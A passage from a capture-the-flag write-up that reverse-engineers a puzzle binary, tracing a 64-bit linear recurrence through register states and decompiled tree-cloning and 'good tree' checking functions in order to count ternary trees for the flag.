&lt;p&gt;We have spot out that the output shares the same prefix when $n=1$ and $n=2$. Maybe we shall see what is going on with &lt;code&gt;sub_400816&lt;/code&gt; - it is simply generating numbers for a sequence, namely $s_n$, indefinitely:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;$s_0 = \text{82F96AC97429A68B}_{16}$,&lt;/li&gt;
&lt;li&gt;$s_1 = \text{32B9B6BCA55548ED}_{16}$, and&lt;/li&gt;
&lt;li&gt;$s_k = 3 s_{k-2} + 2 s_{k-1} + 4\mod2^{64}$ for $k \geq 2$.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let&#39;s generate a bunch of $a_k$&#39;s to see if there is something interesting:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;s_2 = 0xee5fadd5a727857f
s_3 = 0x74ec7fe13e4ee5c9
s_4 = 0xb4f8094372145c13
s_5 = 0xc8b5922a9f156985
...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If we rewrite the program output in terms of $s_k$, we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;n = 0: p4{s_1 88ec405c5c7cf3a1}
n = 1: p4{s_2 32b9b6bca55548ed}
n = 2: p4{s_2 982d2435efffdac7}
n = 3: p4{s_5 s_4}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The output when $n = 3$ is actually composed by two elements in the sequence. It makes us think: is it the case that &lt;code&gt;88ec...&lt;/code&gt; (also &lt;code&gt;32b9...&lt;/code&gt; and &lt;code&gt;982d...&lt;/code&gt;) is an &lt;em&gt;intermediate state&lt;/em&gt;? To verify our thoughts, we are going to dig deeper into the assembly operations.&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-08-confidencectf/ida-400816.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;There are &lt;em&gt;four&lt;/em&gt; operations. Here are the values of &lt;code&gt;v0&lt;/code&gt; and &lt;code&gt;v1&lt;/code&gt; (as defined in &lt;code&gt;sub_400816&lt;/code&gt;) after each of the steps.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;                        /* rcx = c0,              rdx = d0              */
lea  rdx, [rdx+rdx*2]   /* rcx = c0,              rdx = 3*d0            */
lea  rdx, [rdx+rcx*2+4] /* rcx = c0,              rdx = 3*d0 + 2*c0 + 4 */
xchg rcx, rdx           /* rcx = 3*d0 + 2*c0 + 4, rdx = c0              */
jmp  short loc_40082F   /* rcx = 3*d0 + 2*c0 + 4, rdx = c0              */&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With that said, it takes four instructions for a complete cycle inside &lt;code&gt;while&lt;/code&gt;. From the smaller values of $n$, we can see that the output format would be &lt;code&gt;p4{[rdx][rcx]}&lt;/code&gt;. Let&#39;s see some starting values of &lt;code&gt;rcx&lt;/code&gt; and &lt;code&gt;rdx&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; step | rdx              | rcx
------+------------------+------------------
    0 | 32b9b6bca55548ed | 82f96ac97429a68b
    1 | 32b9b6bca55548ed | 88ec405c5c7cf3a1 &amp;lt;- output when n=0
    2 | 32b9b6bca55548ed | ee5fadd5a727857f
    3 | ee5fadd5a727857f | 32b9b6bca55548ed &amp;lt;- output when n=1
    4 | ee5fadd5a727857f | 32b9b6bca55548ed    ...or this?
    5 | ee5fadd5a727857f | 982d2435efffdac7 &amp;lt;- output when n=2
    6 | ee5fadd5a727857f | 74ec7fe13e4ee5c9
    7 | 74ec7fe13e4ee5c9 | ee5fadd5a727857f
    8 | 74ec7fe13e4ee5c9 | ee5fadd5a727857f
    9 | 74ec7fe13e4ee5c9 | cb1f0980f576907d
   10 | 74ec7fe13e4ee5c9 | b4f8094372145c13
   11 | b4f8094372145c13 | 74ec7fe13e4ee5c9
   12 | b4f8094372145c13 | 74ec7fe13e4ee5c9
   13 | b4f8094372145c13 | 5ec57fa3baecb15b
   14 | b4f8094372145c13 | c8b5922a9f156985
   15 | c8b5922a9f156985 | b4f8094372145c13 &amp;lt;- output when n=3
   16 | c8b5922a9f156985 | b4f8094372145c13    ...or this?
   17 | c8b5922a9f156985 | 1ee81bca563d1439
   18 | c8b5922a9f156985 | b053401f9467e747
   19 | b053401f9467e747 | c8b5922a9f156985&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&#34;alert info&#34;&gt;
  :bulb: &lt;strong&gt;Imagination:&lt;/strong&gt; You have opened a process with &lt;code&gt;gdb&lt;/code&gt; that has a breakpoint at the beginning of the function. You are given a set of something (&lt;em&gt;defined in &lt;code&gt;sub_40090D&lt;/code&gt;&lt;/em&gt;) and checks if it has a given attribute (&lt;em&gt;defined in &lt;code&gt;sub_4009C4&lt;/code&gt;&lt;/em&gt;). If so, you call &lt;code&gt;ni&lt;/code&gt; to move to the next step. Finally, you print the registers, extract &lt;code&gt;edx&lt;/code&gt; and &lt;code&gt;ecx&lt;/code&gt;, and print them as the flag.
&lt;/div&gt;
  

&lt;p&gt;So... what is the set of something? And what is the attribute it is checked against?&lt;/p&gt;

&lt;h3 id=&#34;part-ii-collecting-the-pieces-for-the-puzzle&#34;&gt;Part II: Collecting the pieces for the puzzle&lt;/h3&gt;

&lt;p&gt;There are four functions that worth investigating: &lt;code&gt;sub_40090D&lt;/code&gt; (the enumerator), &lt;code&gt;sub_4009C4&lt;/code&gt; (the checker), &lt;code&gt;sub_400A59&lt;/code&gt; (the constructor) and &lt;code&gt;sub_400840&lt;/code&gt; (called from &lt;code&gt;sub_40090D&lt;/code&gt;). We will first look into &lt;code&gt;sub_400840&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400840&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;v3 )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Out of memory ;_;&amp;#34;&lt;/span&gt;);
    abort();
  }
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v3[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_400840(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v3;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since it is allocating 32 bytes, we can define a dummy struct:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; Dummy {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
};&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Loading the struct into IDA, by redefining the types of &lt;code&gt;a1&lt;/code&gt; and &lt;code&gt;v3&lt;/code&gt; as &lt;code&gt;Dummy*&lt;/code&gt;, we have:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;Dummy &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400840&lt;/span&gt;(Dummy &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;src)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  Dummy &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;dest; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  dest &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Dummy &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;dest )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Out of memory ;_;&amp;#34;&lt;/span&gt;);
    abort();
  }
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)dest&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dest&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_400840(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(Dummy &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dest;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It is calling itself recursively. Would it be a &lt;em&gt;deep clone&lt;/em&gt;? Moreover, we can further see that the first four bytes should be &lt;code&gt;size&lt;/code&gt; and it would not be greater than 3. Otherwise &lt;code&gt;8*i+8 &amp;gt;= 32&lt;/code&gt;, overflowing the struct. After all, we think it is a node of the tree - and this is the final struct we have:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; Node {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; size;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// unknown
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;child[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
};&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;More importantly, we can finally claim that &lt;code&gt;sub_400840&lt;/code&gt; is fully reversed.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clone&lt;/span&gt;(Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;src)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;dest; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  dest &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;dest )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Out of memory ;_;&amp;#34;&lt;/span&gt;);
    abort();
  }
  dest&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    dest&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;child[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; clone(src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;child[i]);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dest;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then we will be reversing &lt;code&gt;sub_400A59&lt;/code&gt;. This function is simple, it is defining a path with length $n$. After the tree is constructed, it will be used by &lt;code&gt;sub_400BED&lt;/code&gt; for enumeration. How? Let&#39;s see a baby example when $n = 2$:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  t0_0[shape=point]
  t0_1[shape=point]
  t0_2[shape=point]
  t0_0 -&amp;gt; t0_1 [arrowhead=false]
  t0_1 -&amp;gt; t0_2 [arrowhead=false]
  
  x0[shape=point,style=invis]
  y0[shape=point,style=invis]
  x0-&amp;gt;y0
  
  t1_0[shape=point]
  t1_1[shape=point]
  t1_2[shape=point]
  t1_3[shape=point]
  t1_0 -&amp;gt; t1_1 [arrowhead=false]
  t1_1 -&amp;gt; t1_2 [arrowhead=false]
  t1_1 -&amp;gt; t1_3 [arrowhead=false]
  
  x1[shape=point,style=invis]
  y1[shape=point,style=invis]
  x1-&amp;gt;y1
  
  t2_0[shape=point]
  t2_1[shape=point]
  t2_2[shape=point]
  t2_3[shape=point]
  t2_4[shape=point]
  t2_0 -&amp;gt; t2_1 [arrowhead=false]
  t2_1 -&amp;gt; t2_2 [arrowhead=false]
  t2_1 -&amp;gt; t2_3 [arrowhead=false]
  t2_1 -&amp;gt; t2_4 [arrowhead=false]
  
  x2[shape=point,style=invis]
  y2[shape=point,style=invis]
  x2-&amp;gt;y2
  
  t3_0[shape=point]
  t3_1[shape=point]
  t3_2[shape=point]
  t3_3[shape=point]
  t3_4[shape=point]
  t3_0 -&amp;gt; t3_1 [arrowhead=false]
  t3_0 -&amp;gt; t3_3 [arrowhead=false]
  t3_1 -&amp;gt; t3_2 [arrowhead=false]
  t3_3 -&amp;gt; t3_4 [arrowhead=false]
  
  x3[shape=point,style=invis]
  y3[shape=point,style=invis]
  x3-&amp;gt;y3
  
  t4_0[shape=point]
  t4_1[shape=point]
  t4_2[shape=point]
  t4_3[shape=point]
  t4_4[shape=point]
  t4_5[shape=point]
  t4_0 -&amp;gt; t4_1 [arrowhead=false]
  t4_0 -&amp;gt; t4_3 [arrowhead=false]
  t4_1 -&amp;gt; t4_2 [arrowhead=false]
  t4_3 -&amp;gt; t4_4 [arrowhead=false]
  t4_3 -&amp;gt; t4_5 [arrowhead=false]
  
  x4[shape=point,style=invis]
  y4[shape=point,style=invis]
  x4-&amp;gt;y4
  
  u[label=&amp;#34;...&amp;#34;, shape=plaintext]
  
  x5[shape=point,style=invis]
  y5[shape=point,style=invis]
  x5-&amp;gt;y5
  
  t5_0[shape=point]
  t5_1[shape=point]
  t5_2[shape=point]
  t5_3[shape=point]
  t5_4[shape=point]
  t5_5[shape=point]
  t5_6[shape=point]
  t5_7[shape=point]
  t5_8[shape=point]
  t5_9[shape=point]
  t5_10[shape=point]
  t5_11[shape=point]
  t5_12[shape=point]
  
  t5_0 -&amp;gt; t5_1 [arrowhead=false]
  t5_0 -&amp;gt; t5_2 [arrowhead=false]
  t5_0 -&amp;gt; t5_3 [arrowhead=false]
  t5_1 -&amp;gt; t5_4 [arrowhead=false]
  t5_1 -&amp;gt; t5_5 [arrowhead=false]
  t5_1 -&amp;gt; t5_6 [arrowhead=false]
  t5_2 -&amp;gt; t5_7 [arrowhead=false]
  t5_2 -&amp;gt; t5_8 [arrowhead=false]
  t5_2 -&amp;gt; t5_9 [arrowhead=false]
  t5_3 -&amp;gt; t5_10 [arrowhead=false]
  t5_3 -&amp;gt; t5_11 [arrowhead=false]
  t5_3 -&amp;gt; t5_12 [arrowhead=false]
  
  {rank=same; t0_1; u; x0; y0; x1; y1; x2; y2; x3; y3; x4; y4; x5; y5}
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Well... it is just enumerating all the ternary trees with depth $n$, where each of the leaf node is on level $n$.&lt;/p&gt;

&lt;p&gt;After that, we check the number of &lt;em&gt;good&lt;/em&gt; trees. By &lt;em&gt;good&lt;/em&gt; it is defined by (former) &lt;code&gt;sub_4009C4&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_good_tree&lt;/span&gt;(Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;node, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; k)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ka; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+4h] [rbp-1Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; kb; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+4h] [rbp-1Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Ch] [rbp-4h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  ka &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; k;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; k )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; k )
    ka &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size;
  kb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ka &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( kb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
    kb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)is_good_tree(node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;child[i], kb) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;harrier has implemented a &lt;em&gt;good&lt;/em&gt; tree checker &lt;del&gt;(himself)&lt;/del&gt; in Discord for me to test with:&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-08-confidencectf/harrier-checker.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;After all, a tree is said to be &lt;em&gt;good&lt;/em&gt; if both of the condition are satisfied:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;for each node with two children, every children should have at most one children, and&lt;/li&gt;
&lt;li&gt;for each node with three children, every children and their grandchildren should have at most one children.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Cool. We have the pieces of the puzzle gathered. Define $g(n)$ to be the number of good trees of depth $n$. We are going to find $g(1337)$ and move the sequence forward by $g(1337)$ instructions.&lt;/p&gt;

&lt;h3 id=&#34;part-iii-verifying-this-for-the-baby-cases&#34;&gt;Part III: Verifying this for the baby cases&lt;/h3&gt;

&lt;p&gt;We are double checking if our observation checks out for smaller $n$&#39;s. From above, $g(0) = 1$, $g(1) = 3\ \text{or}\ 4$, $g(2) = 5$ and $g(3) = 15\ \text{or}\ 16$.&lt;/p&gt;

&lt;p&gt;For $n = 0$, the only tree would be:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=point]
  edge[arrowhead=false]
  
  t0
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Yeah. It is a good tree. Thus $g(0) = 1$. Also, $g(1) = 3$ since the three trees are all good:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=point]
  edge[arrowhead=false]
  
  t0_0 -&amp;gt; t0_1 
  
  t1_0 -&amp;gt; t1_1 
  t1_0 -&amp;gt; t1_2 
  
  t2_0 -&amp;gt; t2_1 
  t2_0 -&amp;gt; t2_2 
  t2_0 -&amp;gt; t2_3 
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For $n = 2$, we start rejecting trees. There are 39 trees, but there are only five being good. Hence $g(2) = 5$.&lt;/p&gt;
